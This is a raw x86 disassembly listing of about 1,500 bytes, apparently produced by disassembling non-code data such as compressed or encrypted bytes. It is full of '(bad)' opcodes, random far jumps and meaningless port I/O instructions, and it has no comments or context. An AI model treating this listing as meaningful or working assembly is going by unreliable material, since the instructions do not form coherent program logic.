  413c30:	push   ebp
  413c31:	add    DWORD PTR [edi+eax*2+0x46316f64],esp
  413c38:	loopne 0x413cb6
  413c3a:	sbb    eax,0x437d7317
  413c3f:	mov    bh,0x55
  413c41:	imul   ecx,DWORD PTR [ebp-0x1a],0xbdfe8635
  413c48:	pop    ds
  413c49:	sbb    DWORD PTR [edx],ebp
  413c4b:	sub    bl,BYTE PTR [ecx+0x33]
  413c4e:	jno    0x413c3e
  413c50:	mov    ah,ah
  413c52:	push   edx
  413c53:	add    esi,eax
  413c55:	ror    BYTE PTR [ecx-0x33eacb10],1
  413c5b:	sbb    ecx,ecx
  413c5d:	mov    bh,0x7
  413c5f:	adc    esp,ebx
  413c61:	test   al,0x8
  413c63:	adc    bh,BYTE PTR [eax+0x1]
  413c66:	stos   DWORD PTR es:[edi],eax
  413c67:	(bad)  
  413c68:	push   ecx
  413c69:	sub    BYTE PTR [ebx+esi*2-0xccad706],0xe1
  413c71:	xchg   ecx,eax
  413c72:	lea    ecx,[edi+0x2f]
  413c75:	mov    ecx,0xdbe2d4cf
  413c7a:	int3   
  413c7b:	adc    DWORD PTR [ebp-0x59],edi
  413c7e:	shl    DWORD PTR [eax-0x2d],1
  413c81:	jns    0x413cc1
  413c83:	pop    edx
  413c84:	mov    ecx,0x473b34cb
  413c89:	in     al,dx
  413c8a:	pop    esp
  413c8b:	sub    al,0xe8
  413c8d:	and    ebx,0x7a
  413c90:	out    dx,al
  413c91:	sub    DWORD PTR [ebp-0x70],esi
  413c94:	push   ds
  413c95:	scas   al,BYTE PTR es:[edi]
  413c96:	mov    ds:0x522a2e47,al
  413c9b:	loope  0x413c43
  413c9d:	outs   dx,BYTE PTR ds:[esi]
  413c9e:	adc    ah,bl
  413ca0:	sar    DWORD PTR [esi+0xf],0x3e
  413ca4:	sub    DWORD PTR [edi+0x638f1bd9],0x61
  413cab:	gs test al,0x13
  413cae:	xchg   edi,eax
  413caf:	xchg   DWORD PTR [eax+0x42],esp
  413cb2:	inc    esi
  413cb3:	(bad)  
  413cb4:	adc    al,0x51
  413cb6:	sbb    ecx,esi
  413cb8:	dec    esi
  413cb9:	push   ebp
  413cba:	jle    0x413c88
  413cbc:	mov    es,WORD PTR ds:0x47a1dd42
  413cc2:	popf   
  413cc3:	retf   0xbccb
  413cc6:	sbb    cl,dl
  413cc8:	shr    DWORD PTR [esp+ecx*2+0x7e],cl
  413ccc:	lea    edi,[ebp+0x59]
  413ccf:	sub    al,BYTE PTR [eax-0x10a453f8]
  413cd5:	add    eax,0x7b930dce
  413cda:	shl    DWORD PTR [edx+0x5],cl
  413cdd:	jle    0x413d07
  413cdf:	stc    
  413ce0:	jmp    DWORD PTR [ecx-0x410829d2]
  413ce6:	push   ds
  413ce7:	pop    ebp
  413ce8:	lahf   
  413ce9:	mov    ds:0x37e2bc46,al
  413cee:	pop    ss
  413cef:	rcl    BYTE PTR [ecx],1
  413cf1:	jno    0x413ca7
  413cf3:	mov    BYTE PTR [ebx+0x40],dl
  413cf6:	mov    WORD PTR [ebx-0x14b3cc2e],es
  413cfc:	bound  edx,QWORD PTR [esi-0x513f2102]
  413d02:	mov    ch,BYTE PTR [ecx+edi*8+0x5121e77]
  413d09:	(bad)  
  413d0a:	fs jp  0x413d5d
  413d0d:	mov    esi,0x5e6f97f0
  413d12:	xor    DWORD PTR [edx],ebx
  413d14:	es stos DWORD PTR es:[edi],eax
  413d16:	inc    eax
  413d17:	cs add al,0x83
  413d1a:	adc    dh,dh
  413d1c:	ror    dh,1
  413d1e:	inc    esi
  413d1f:	out    dx,al
  413d20:	mov    DWORD PTR [ebp+0x40],ebx
  413d23:	xor    dl,BYTE PTR ds:0xae8c9ec7
  413d29:	not    DWORD PTR [esi+eax*8]
  413d2c:	xchg   esi,eax
  413d2d:	or     BYTE PTR [ecx+0x59],0xd4
  413d31:	stos   BYTE PTR es:[edi],al
  413d32:	rcl    ch,0xee
  413d35:	add    al,0x36
  413d37:	in     al,dx
  413d38:	mov    edi,edx
  413d3a:	inc    edi
  413d3b:	inc    ecx
  413d3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d3d:	ss dec ebx
  413d3f:	mov    ebx,edi
  413d41:	lods   eax,DWORD PTR ds:[esi]
  413d42:	pop    ebx
  413d43:	mov    ebp,0x4b36d8d3
  413d48:	add    al,0x9d
  413d4a:	shr    edi,1
  413d4c:	pop    ebx
  413d4d:	jmp    0x92d:0x5306f161
  413d54:	and    cl,0x7a
  413d57:	xor    edi,DWORD PTR [edi+0xf]
  413d5a:	ret    0xa283
  413d5d:	pop    ebp
  413d5e:	xchg   ebp,eax
  413d5f:	aaa    
  413d60:	pushf  
  413d61:	or     BYTE PTR [esi+0x35cd66b0],0x2f
  413d68:	sahf   
  413d69:	pop    edi
  413d6a:	inc    eax
  413d6b:	fs (bad) 
  413d6d:	das    
  413d6e:	sbb    DWORD PTR [edx-0x20],esp
  413d71:	outs   dx,DWORD PTR ds:[esi]
  413d72:	pushf  
  413d73:	jns    0x413d62
  413d75:	push   cs
  413d76:	or     al,0xd3
  413d78:	jne    0x413dbd
  413d7a:	scas   eax,DWORD PTR es:[edi]
  413d7b:	push   edx
  413d7c:	sub    BYTE PTR [esi],dh
  413d7e:	loopne 0x413df1
  413d80:	sbb    DWORD PTR [ebx+0x428dc85a],0x79
  413d87:	mov    edx,edx
  413d89:	xor    BYTE PTR [ebx+0x684158b1],dh
  413d8f:	mov    ds:0xc5b95e7d,al
  413d94:	push   0xffffffae
  413d96:	cmp    al,0xae
  413d98:	jbe    0x413d3b
  413d9a:	int3   
  413d9b:	cmp    BYTE PTR [edi+0x32261075],ch
  413da1:	jb     0x413d3f
  413da3:	(bad)  
  413da4:	cwde   
  413da5:	cld    
  413da6:	push   esp
  413da7:	pop    ebx
  413da8:	test   eax,0xc4196287
  413dad:	cs dec ecx
  413daf:	int    0xd1
  413db1:	inc    edx
  413db2:	adc    al,0xe3
  413db4:	jle    0x413e21
  413db6:	lahf   
  413db7:	mov    eax,0xa0b7333d
  413dbc:	inc    eax
  413dbd:	ds mov ebp,0xc6ae5109
  413dc3:	fld    DWORD PTR [edx+eax*1+0x5b6709bb]
  413dca:	mov    al,0x1e
  413dcc:	cld    
  413dcd:	pop    ebp
  413dce:	mov    BYTE PTR [edi-0x72],dh
  413dd1:	xchg   esp,eax
  413dd2:	or     bl,dl
  413dd4:	jno    0x413e0c
  413dd6:	jmp    DWORD PTR [eax]
  413dd8:	inc    esp
  413dd9:	sar    ah,cl
  413ddb:	xor    al,0x60
  413ddd:	daa    
  413dde:	in     al,0x3e
  413de0:	or     al,0xc5
  413de2:	psubusb mm4,mm1
  413de5:	mov    eax,0x3bdd9ce7
  413dea:	add    al,0x46
  413dec:	sbb    al,0x93
  413dee:	xchg   DWORD PTR [eax+0xd],edx
  413df1:	test   al,0x9d
  413df3:	leave  
  413df4:	inc    eax
  413df5:	enter  0x8b4b,0x19
  413df9:	inc    ecx
  413dfa:	cmp    ecx,DWORD PTR [ecx+0xc]
  413dfd:	nop
  413dfe:	in     al,dx
  413dff:	pop    edx
  413e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e01:	div    BYTE PTR [edi-0x16ea9e51]
  413e07:	jo     0x413dce
  413e09:	push   ecx
  413e0a:	(bad)  
  413e0b:	int    0xed
  413e0d:	mov    ebp,0x8e9a9dcd
  413e12:	pop    ebx
  413e13:	xor    dh,BYTE PTR [edx]
  413e15:	retf   0x4da6
  413e18:	fstp   TBYTE PTR [edx]
  413e1a:	jecxz  0x413e22
  413e1c:	int    0xc8
  413e1e:	xchg   DWORD PTR [esi],eax
  413e20:	test   eax,0x5953930b
  413e25:	push   esi
  413e26:	and    ebx,DWORD PTR [bx+di+0x74]
  413e2a:	or     BYTE PTR [edx+0x5e65e39],dh
  413e30:	inc    edi
  413e31:	mov    BYTE PTR [esi+0x34785af4],bl
  413e37:	dec    esi
  413e38:	je     0x413e7b
  413e3a:	add    DWORD PTR [esi+0x7be0d061],edi
  413e40:	cmp    al,BYTE PTR [ecx-0x1a5d8cd7]
  413e46:	stc    
  413e47:	mov    BYTE PTR ds:0x1d0,bl
  413e4c:	scas   al,BYTE PTR es:[edi]
  413e4d:	or     al,0xbe
  413e4f:	cwde   
  413e50:	xor    al,0x2a
  413e52:	ja     0x413e1a
  413e54:	lds    ebx,FWORD PTR [esi-0xbc24ea5]
  413e5a:	repz adc DWORD PTR [ebx-0xce4135b],edx
  413e61:	sbb    edi,DWORD PTR [edi-0x1525d3a0]
  413e67:	mov    edx,0x90e0065
  413e6c:	mov    bl,BYTE PTR [eax]
  413e6e:	cmp    al,bl
  413e70:	mov    dh,0x7c
  413e72:	or     ebx,ebp
  413e74:	xchg   ebx,eax
  413e75:	push   ss
  413e76:	jo     0x413e6d
  413e78:	sub    eax,0xb4a849e
  413e7d:	jo     0x413e96
  413e7f:	add    eax,0x506c6abf
  413e84:	xchg   ebp,eax
  413e85:	repnz and esi,DWORD PTR ds:[ebx+ebp*2+0x70]
  413e8b:	leave  
  413e8c:	fwait
  413e8d:	and    eax,DWORD PTR [edi-0x2baa796b]
  413e93:	shl    ebx,0x4a
  413e96:	test   al,0x44
  413e98:	lahf   
  413e99:	and    ebx,edx
  413e9b:	mov    eax,0x7a5f610d
  413ea0:	xor    dh,BYTE PTR [edx+0x44]
  413ea3:	push   esi
  413ea4:	dec    esp
  413ea5:	outs   dx,DWORD PTR ds:[esi]
  413ea6:	push   0x3dd5e47a
  413eab:	push   ds
  413eac:	add    eax,0x96f5428c
  413eb1:	push   0xffffffa2
  413eb3:	es test eax,0xf02a92ed
  413eb9:	les    ebx,FWORD PTR [ecx]
  413ebb:	inc    ecx
  413ebc:	aas    
  413ebd:	dec    ecx
  413ebe:	call   0x6d09:0x42b33cf5
  413ec5:	jae    0x413f17
  413ec7:	test   DWORD PTR [ebx],edx
  413ec9:	out    dx,eax
  413eca:	xchg   esp,eax
  413ecb:	sti    
  413ecc:	(bad)  
  413ecd:	daa    
  413ece:	clc    
  413ecf:	push   edx
  413ed0:	cmp    DWORD PTR [edx-0x70d3c46a],ebp
  413ed6:	fidiv  DWORD PTR [edi-0x75]
  413ed9:	xchg   esp,eax
  413eda:	sub    ebp,eax
  413edc:	xchg   esi,eax
  413edd:	loop   0x413e64
  413edf:	jb     0x413ef4
  413ee1:	jmp    edi
  413ee3:	(bad)  
  413ee4:	imul   esp,DWORD PTR [esi-0x3],0xffffff87
  413ee8:	jge    0x413ef3
  413eea:	retf   0xf299
  413eed:	inc    edx
  413eee:	call   0x3dd47514
  413ef3:	push   0x3c
  413ef5:	sbb    ebp,DWORD PTR [edx-0x72]
  413ef8:	outs   dx,BYTE PTR ds:[esi]
  413ef9:	xor    eax,DWORD PTR [edi]
  413efb:	inc    DWORD PTR [eax]
  413efd:	dec    esp
  413efe:	mov    esp,DWORD PTR [eax]
  413f00:	fcomp  DWORD PTR [eax-0x39]
  413f03:	std    
  413f04:	pop    esi
  413f05:	ror    DWORD PTR [esi+edi*4],cl
  413f08:	adc    al,0xb2
  413f0a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f0b:	or     eax,0x3d9c4235
  413f10:	push   0xffffff88
  413f12:	mov    WORD PTR [eax+ebp*1-0x5c900849],?
  413f19:	scas   al,BYTE PTR es:[edi]
  413f1a:	pushf  
  413f1b:	call   0x2f0878ba
  413f20:	pusha  
  413f21:	sub    al,0x11
  413f23:	dec    esp
  413f24:	es push esp
  413f26:	pop    esi
  413f27:	jnp    0x413ed3
  413f29:	std    
  413f2a:	jge    0x413efb
  413f2c:	xchg   esi,eax
  413f2d:	cld    
  413f2e:	sub    BYTE PTR [esi],0x93
  413f31:	leave  
  413f32:	xor    DWORD PTR [ecx+0x22],edi
  413f35:	pushf  
  413f36:	sbb    ebx,eax
  413f38:	mov    bl,0xbf
  413f3a:	cmp    BYTE PTR [eax],dh
  413f3c:	test   DWORD PTR [edi-0x2a],0x5181114b
  413f43:	push   0x30cf0246
  413f48:	fmulp  st(6),st
  413f4a:	fnstsw WORD PTR ds:0x2fec61ce
  413f50:	(bad)  
  413f52:	sub    esi,ecx
  413f54:	push   edi
  413f55:	ins    DWORD PTR es:[edi],dx
  413f56:	inc    edi
  413f57:	in     al,dx
  413f58:	out    0x97,al
  413f5a:	jnp    0x413ee0
  413f5c:	jmp    0x47cc:0xa7e8a03d
  413f63:	fisubr DWORD PTR [eax-0x2a]
  413f66:	ds dec ebp
  413f68:	ins    DWORD PTR es:[edi],dx
  413f69:	push   0x42d81255
  413f6e:	lds    edx,FWORD PTR [eax-0x1c]
  413f71:	mov    BYTE PTR [eax+0x21],bh
  413f74:	jmp    0x413f37
  413f76:	ds or  eax,0xe60ed09b
  413f7c:	mov    dl,0xf9
  413f7e:	loope  0x413fd3
  413f80:	ins    BYTE PTR es:[edi],dx
  413f81:	pusha  
  413f82:	dec    eax
  413f83:	mov    WORD PTR [esi-0x30a4dd28],cs
  413f89:	push   cs
  413f8a:	adc    bh,al
  413f8c:	inc    esp
  413f8d:	inc    eax
  413f8e:	and    eax,0x2694e699
  413f93:	frndint 
  413f95:	sub    esi,DWORD PTR [ebx]
  413f97:	mov    dl,0xa7
  413f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f9a:	xchg   ecx,esp
  413f9c:	test   DWORD PTR fs:[esi-0x52],ecx
  413fa0:	adc    BYTE PTR [di],dh
  413fa3:	mov    bh,0x22
  413fa5:	retf   0x68a9
  413fa8:	int3   
  413fa9:	stc    
  413faa:	pop    ebp
  413fab:	mov    al,ds:0x77190d45
  413fb0:	popa   
  413fb1:	out    dx,al
  413fb2:	jb     0x413fbd
  413fb4:	nop
  413fb5:	dec    ecx
  413fb6:	mov    ah,BYTE PTR [ebx]
  413fb8:	or     ch,dh
  413fba:	enter  0x6d64,0xa3
  413fbe:	sbb    bl,ch
  413fc0:	and    eax,0x8c58622a
  413fc5:	mov    WORD PTR [ecx-0x2b],es
  413fc8:	(bad)  
  413fc9:	push   edi
  413fca:	push   0xffffff8b
  413fcc:	inc    esp
  413fcd:	div    BYTE PTR [eax]
  413fcf:	adc    eax,0x58a98dcf
  413fd4:	int    0x6c
  413fd6:	mov    eax,DWORD PTR [esi]
  413fd8:	and    BYTE PTR [edi],bh
  413fda:	jne    0x413f70
  413fdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fdd:	call   0x29c93307
  413fe2:	jae    0x41404b
  413fe4:	pop    edx
  413fe5:	mov    esi,0xa3daaa45
  413fea:	sbb    ebx,ecx
  413fec:	stos   BYTE PTR es:[edi],al
  413fed:	sub    al,BYTE PTR [ecx]
  413fef:	fwait
  413ff0:	sub    dl,BYTE PTR [esp+ebp*1]
  413ff3:	(bad)  
  413ff4:	push   ebp
  413ff5:	imul   edi,DWORD PTR [ecx+ecx*8-0x59101b0d],0xffffffc2
  413ffd:	lock jle 0x414079
  414000:	shl    ch,0x18
  414003:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414004:	repnz add BYTE PTR [edx+0x2ce64fec],ch
  41400b:	inc    ebx
  41400c:	inc    esi
  41400d:	jno    0x414047
  41400f:	inc    edx
  414010:	fwait
  414011:	pop    edi
  414012:	pslld  mm1,mm3
  414015:	(bad)  
  414016:	cld    
  414017:	fwait
  414018:	scas   al,BYTE PTR es:[edi]
  414019:	adc    eax,0xefc5a357
  41401e:	push   ecx
  41401f:	adc    al,0xf0
  414022:	jbe    0x413ff2
  414024:	push   esi
  414025:	pusha  
  414026:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414027:	sar    BYTE PTR [esi*8+0x57f9bf38],cl
  41402e:	xor    cl,BYTE PTR [ecx-0x5c]
  414031:	sbb    eax,DWORD PTR [ebx+0x211b289e]
  414037:	ds leave 
  414039:	push   esi
  41403a:	test   bh,al
  41403c:	cmp    al,0x17
  41403e:	clc    
  41403f:	inc    esi
  414040:	mov    ds:0xdd663f9,eax
  414045:	hlt    
  414046:	mov    al,BYTE PTR [esi]
  414048:	pop    ss
  414049:	loop   0x4140b8
  41404b:	dec    eax
  41404c:	rcl    BYTE PTR [edi+edi*2+0xda7c54a],cl
  414053:	imul   ebp,DWORD PTR [ebx-0x4199f113],0xffffff92
  41405a:	nop
  41405b:	retf   0x98e0
  41405e:	mov    ds:0x773b5eb6,eax
  414063:	dec    ecx
  414064:	add    al,0x93
  414066:	sbb    edi,ecx
  414068:	mov    dh,0x9a
  41406a:	cdq    
  41406b:	push   edi
  41406c:	xchg   ebx,eax
  41406d:	fisub  DWORD PTR [edi+0x3a]
  414070:	rol    dl,1
  414072:	loop   0x414099
  414074:	(bad)  ds:0x8bf5b499
  41407a:	jbe    0x4140cf
  41407c:	jp     0x4140cc
  41407e:	mov    ch,0xa7
  414080:	aam    0x57
  414082:	outs   dx,BYTE PTR ds:[esi]
  414083:	or     eax,0x3af43872
  414088:	ffreep st(2)
  41408a:	call   0xe49e:0x4ed234d3
  414091:	dec    esi
  414092:	stos   BYTE PTR es:[edi],al
  414093:	mul    BYTE PTR [ebp-0x62]
  414096:	sbb    eax,0xab46da18
  41409b:	mov    eax,0x6541c708
  4140a0:	mov    cl,0x55
  4140a2:	push   eax
  4140a3:	leave  
  4140a4:	mov    esp,0x3e3995df
  4140a9:	icebp  
  4140aa:	js     0x414118
  4140ac:	bound  esi,QWORD PTR [ecx+edi*2-0x1fe56550]
  4140b3:	mov    esp,DWORD PTR [eax]
  4140b5:	jo     0x414085
  4140b7:	cwde   
  4140b8:	pop    edi
  4140b9:	push   esi
  4140ba:	push   edx
  4140bb:	fs call 0xcd51:0x1e76753f
  4140c3:	cdq    
  4140c4:	(bad)  
  4140c5:	out    dx,eax
  4140c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140c7:	inc    esi
  4140c8:	repz call 0xf1d82049
  4140ce:	xchg   edi,eax
  4140cf:	jae    0x4140c1
  4140d1:	pop    edi
  4140d2:	scas   al,BYTE PTR es:[edi]
  4140d3:	add    BYTE PTR [eax],dh
  4140d5:	sbb    al,BYTE PTR [ecx+0x55]
  4140d8:	mov    ebx,0x66ceeec6
  4140dd:	xchg   bh,dl
  4140df:	push   ebp
  4140e0:	fld    QWORD PTR [esi-0x385d9082]
  4140e6:	test   eax,0xd445f8bf
  4140eb:	or     BYTE PTR [ecx-0x1e],0x40
  4140ef:	in     eax,0xf9
  4140f1:	xor    BYTE PTR [ebp+0x20],cl
  4140f4:	mov    BYTE PTR [edx+0x8d6c0b3],0x48
  4140fb:	push   esi
  4140fc:	(bad)  
  4140fd:	in     al,0x3a
  4140ff:	mov    bh,BYTE PTR [ebp-0x758b9ecb]
  414105:	les    ebp,FWORD PTR [edx+0x21]
  414108:	mov    esp,0xdc29958c
  41410d:	sub    al,0x9f
  41410f:	sbb    al,0x12
  414111:	push   ebx
  414112:	jo     0x4140e8
  414114:	lock jae 0x41416a
  414117:	(bad)  
  414119:	frstor [edi]
  41411b:	call   0x5568823d
  414120:	into   
  414121:	popa   
  414122:	ret    0xbf2e
  414125:	imul   esi,DWORD PTR [ebp-0xc],0x77
  414129:	pop    esp
  41412a:	cdq    
  41412b:	dec    esp
  41412c:	fadd   DWORD PTR [ecx+0x76]
  41412f:	sub    al,bl
  414131:	push   0x12
  414133:	fldenv [ecx+ebp*2+0x43]
  414137:	ror    BYTE PTR [edi-0x6d],1
  41413a:	adc    cl,BYTE PTR [esi+0x41]
  41413d:	dec    edi
  41413e:	in     eax,0x95
  414140:	mov    ss,WORD PTR [ebx+ecx*8]
  414143:	pushf  
  414144:	push   esp
  414145:	scas   eax,DWORD PTR es:[edi]
  414146:	ja     0x4140d3
  414148:	mov    ch,0x60
  41414a:	jne    0x4141c1
  41414c:	cmp    eax,0x6dabb2a5
  414151:	jecxz  0x4140da
  414153:	jg     0x414173
  414155:	sbb    DWORD PTR [ebx],ebp
  414157:	pop    esp
  414158:	daa    
  414159:	pop    edx
  41415a:	lds    edi,FWORD PTR [esi]
  41415c:	pop    esi
  41415d:	popf   
  41415e:	shl    BYTE PTR [ebx+eax*2],0xaa
  414162:	push   ebp
  414163:	ret    0xbbbe
  414166:	mov    al,0x77
  414168:	cmp    eax,0x1d96a41b
  41416d:	popf   
  41416e:	sbb    DWORD PTR [ebp-0x4aa0c47e],edx
  414174:	add    bh,dh
  414176:	out    dx,al
  414177:	div    cl
  414179:	sahf   
  41417a:	data16 sahf 
  41417c:	adc    dh,BYTE PTR [edi]
  41417e:	mov    bh,0x83
  414180:	mov    edi,0xc41aac12
  414185:	pop    ds
  414186:	sbb    esp,DWORD PTR [ebp+0x4bcf028e]
  41418c:	ror    DWORD PTR [eax-0x4],0xc6
  414190:	xchg   edx,eax
  414191:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414192:	mov    al,0xb8
  414194:	rol    BYTE PTR [ebx+0x62],cl
  414197:	xchg   esp,eax
  414198:	xchg   esi,eax
  414199:	mov    ?,WORD PTR [ebx+0xaded54d]
  41419f:	xchg   esi,eax
  4141a0:	leave  
  4141a1:	stos   BYTE PTR es:[di],al
  4141a3:	jno    0x414141
  4141a5:	jne    0x4141df
  4141a7:	rcr    BYTE PTR [edx-0x68438936],0xc2
  4141ae:	cmp    cl,ah
  4141b0:	pop    ss
  4141b1:	cmp    esi,ecx
  4141b3:	fs pop edi
  4141b5:	sub    eax,0x422eda75
  4141ba:	and    ecx,DWORD PTR [ecx-0x65cdec7e]
  4141c0:	mov    ebx,0x64ae3407
  4141c5:	outs   dx,BYTE PTR ds:[esi]
  4141c6:	frstpm(287 only) 
  4141c8:	adc    al,0xce
  4141ca:	jecxz  0x41420b
  4141cc:	xchg   ebp,eax
  4141cd:	push   0x14299937
  4141d2:	mov    ch,0x63
  4141d4:	jnp    0x4141d8
  4141d6:	or     DWORD PTR [ebp+eax*8-0x61],ebx
  4141da:	lods   eax,DWORD PTR ds:[esi]
  4141db:	mov    dl,0x32
  4141dd:	(bad)  
  4141de:	scas   eax,DWORD PTR es:[edi]
  4141df:	jmp    0x4141b4
  4141e1:	mov    esi,0x7b3c00b3
  4141e6:	out    0x40,eax
  4141e8:	call   0xad8:0x84eccbd1
  4141ef:	in     eax,dx
  4141f0:	rcr    DWORD PTR [eax+0x33940444],1
  4141f6:	call   0xfede8f86
  4141fb:	push   ebp
  4141fc:	push   edx
  4141fd:	and    DWORD PTR [ecx+0x292ac219],ebp
  414203:	imul   BYTE PTR [ebp+0x6a]
  414206:	mov    edi,edi
  414208:	loop   0x4141e2
  41420a:	inc    edx
  41420b:	adc    al,BYTE PTR [edx]
  41420d:	scas   al,BYTE PTR es:[edi]
  41420e:	push   0x42623e72
  414213:	nop
  414214:	mov    WORD PTR [ebx+0x72],fs
  414217:	stos   DWORD PTR es:[edi],eax
  414218:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414219:	push   ebx
  41421a:	leave  
  41421b:	mov    al,ds:0xef1c9504
  414220:	jo     0x4141de
  414222:	push   ebp
  414223:	add    esi,DWORD PTR [esp+ebx*2+0x33]
  414227:	enter  0x981d,0x61
  41422b:	sub    edi,DWORD PTR [ecx+0x2e903505]
  414231:	sbb    edx,esp
  414233:	and    DWORD PTR [edi+0x7dafe45b],esp
  414239:	std    
  41423a:	aaa    
  41423b:	retf   0x4866
  41423e:	lds    edi,FWORD PTR [esp+edi*8+0x3e]
  414242:	mov    gs:0x72ab7b07,al
  414248:	ficomp WORD PTR [edi-0x12]
  41424b:	lock pop ds
  41424d:	ror    esi,cl
  41424f:	cmp    al,0x1a
  414251:	pop    edi
  414252:	add    eax,0xbbd8d56b
  414257:	add    DWORD PTR [edi+0x10],ecx
  41425a:	icebp  
  41425b:	mov    al,ds:0x79a2bd80
  414260:	daa    
  414261:	es out dx,al
  414263:	(bad)  
  414264:	int    0x65
  414266:	mov    eax,DWORD PTR [eax+eax*4+0x3a31c1c9]
  41426d:	xor    BYTE PTR [ecx],bl
  41426f:	sti    
  414270:	ins    BYTE PTR es:[edi],dx
  414271:	pop    ecx
  414272:	outs   dx,DWORD PTR ds:[esi]
  414273:	sub    DWORD PTR [edi-0xa],0xffffff9f
  414277:	enter  0xb462,0x1e
  41427b:	daa    
  41427c:	xlat   BYTE PTR ds:[ebx]
  41427d:	add    esp,DWORD PTR [eax]
  41427f:	(bad)  
  414281:	dec    esi
  414282:	and    eax,esi
  414284:	sbb    DWORD PTR [eax],esi
  414286:	mov    fs,eax
  414288:	lds    eax,FWORD PTR [eax+ebp*1]
  41428b:	add    esi,DWORD PTR [ecx]
  41428d:	pop    ecx
  41428e:	pop    ds
  41428f:	int3   
  414290:	inc    esp
  414291:	jo     0x41423f
  414293:	call   0x1f6f:0x57f97d4f
  41429a:	dec    ebp
  41429b:	pop    eax
  41429c:	rol    BYTE PTR [ecx+ecx*4-0x12],1
  4142a0:	pop    ds
  4142a1:	dec    edi
  4142a2:	enter  0xd18a,0xe7
  4142a6:	iret   
  4142a7:	in     eax,0x89
  4142a9:	std    
  4142aa:	into   
  4142ab:	ja     0x4142b5
  4142ad:	push   esp
  4142ae:	popf   
  4142af:	das    
  4142b0:	push   ebx
  4142b1:	mov    ds:0x2ec98532,al
  4142b6:	mov    dl,0x76
  4142b8:	outs   dx,DWORD PTR gs:[esi]
  4142ba:	aad    0x61
  4142bc:	rcl    DWORD PTR [edi+0x72b4bca0],1
  4142c2:	pop    edi
  4142c3:	cmp    al,0x4b
  4142c5:	imul   ebp,DWORD PTR [esi+ebx*4],0x8e5732ba
  4142cc:	inc    ebx
  4142cd:	ds cdq 
  4142cf:	out    dx,al
  4142d0:	fs out 0x4a,al
  4142d3:	shl    bl,1
  4142d5:	add    eax,0x72a4dd1b
  4142da:	int    0xd9
  4142dc:	leave  
  4142dd:	mov    bh,0x7f
  4142df:	jmp    0x414341
  4142e1:	ja     0x414353
  4142e3:	adc    ch,al
  4142e5:	sub    eax,0x51ec3d2e
  4142ea:	lahf   
  4142eb:	cmp    eax,0x9f3a90d
  4142f0:	push   ss
  4142f1:	xchg   edx,eax
  4142f2:	xchg   eax,ebx
  4142f4:	stc    
  4142f5:	xchg   edx,eax
  4142f6:	ins    BYTE PTR es:[edi],dx
  4142f7:	or     al,0xbf
  4142f9:	ins    DWORD PTR es:[edi],dx
  4142fa:	imul   ecx,DWORD PTR [ebx],0x49
  4142fd:	xor    eax,0x1003c966
  414302:	mov    ah,0x95
  414304:	xchg   edi,eax
  414305:	je     0x4142f4
  414307:	clc    
  414308:	les    edi,FWORD PTR [esi-0x1e700e9]
  41430e:	sbb    eax,0xcc73cfff
  414313:	mov    al,ds:0xbf5bd57
  414318:	add    BYTE PTR ds:0xfa3ed72b,ch
  41431e:	sub    eax,0x75beddac
  414323:	dec    edx
  414324:	lock (bad) 
  414326:	lea    eax,[edx+0xfc5e547]
  41432c:	dec    esp
  41432d:	or     BYTE PTR [edi+eax*2+0x1a],ah
  414331:	shr    BYTE PTR [edi+0x2d],cl
  414334:	jae    0x41435f
  414336:	iret   
  414337:	and    eax,0xd4475c20
  41433c:	jae    0x4143b2
  41433e:	adc    al,0xef
  414340:	lods   al,BYTE PTR ds:[esi]
  414341:	dec    edx
  414342:	add    al,0x1f
  414344:	cmp    esi,DWORD PTR [esi]
  414346:	xor    DWORD PTR [ecx-0x27793e3c],edi
  41434c:	arpl   WORD PTR [eax],cx
  41434e:	(bad)  
  41434f:	pop    ebx
  414350:	arpl   sp,si
  414352:	ret    
  414353:	aam    0xc8
  414355:	and    ecx,ebx
  414357:	inc    eax
  414358:	sbb    eax,0xcbf20d8d
  41435d:	repnz mov bl,0x4
  414360:	hlt    
  414361:	or     dh,0x29
  414364:	pop    esi
  414365:	mov    ebp,0xa3b3d920
  41436a:	dec    ecx
  41436b:	push   ebx
  41436c:	and    DWORD PTR [ebx],0x2e
  41436f:	das    
  414370:	cwde   
  414371:	clts   
  414373:	jecxz  0x414359
  414375:	in     eax,dx
  414376:	sub    DWORD PTR [ebp-0x712cf9b6],0x110d3016
  414380:	aad    0x7a
  414382:	sub    ebx,DWORD PTR [edx+0x1ccbd5bd]
  414388:	add    al,0x88
  41438a:	repz push eax
  41438c:	call   0x24636beb
  414391:	leave  
  414392:	adc    BYTE PTR [edi-0x4f],0xc6
  414396:	repnz xor ebx,DWORD PTR [esi]
  414399:	pop    esi
  41439a:	jne    0x414351
  41439c:	xor    al,0x4c
  41439e:	push   esi
  41439f:	push   ebx
  4143a0:	cld    
  4143a1:	adc    al,0x12
  4143a3:	jae    0x414422
  4143a5:	fsub   st,st(7)
  4143a7:	dec    ebp
  4143a8:	cmp    DWORD PTR [edx-0x3f],edi
  4143ab:	xchg   edi,eax
  4143ac:	lods   al,BYTE PTR ds:[esi]
  4143ad:	(bad)
  4143b1:	jne    0x41442c
  4143b3:	adc    al,0xc8
  4143b5:	cmp    dl,bl
  4143b7:	ja     0x4143ae
  4143b9:	pop    edx
  4143ba:	push   ebp
  4143bb:	and    esp,ecx
  4143bd:	mov    dx,WORD PTR [ecx+edx*8]
  4143c1:	aam    0xa
  4143c3:	add    al,0x57
  4143c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143c6:	mov    bl,0x99
  4143c8:	jno    0x414364
  4143ca:	push   ebx
  4143cb:	mov    cl,0x3b
  4143cd:	xchg   ebx,eax
  4143ce:	jnp    0x41444e
  4143d0:	or     BYTE PTR [ecx],al
  4143d2:	cmc    
  4143d3:	icebp  
  4143d4:	nop
  4143d5:	test   eax,edi
  4143d7:	pop    ecx
  4143d8:	cmp    al,0x57
  4143da:	int    0xff
  4143dc:	retf   0x6401
  4143df:	stc    
  4143e0:	cmc    
  4143e1:	sub    al,0xc6
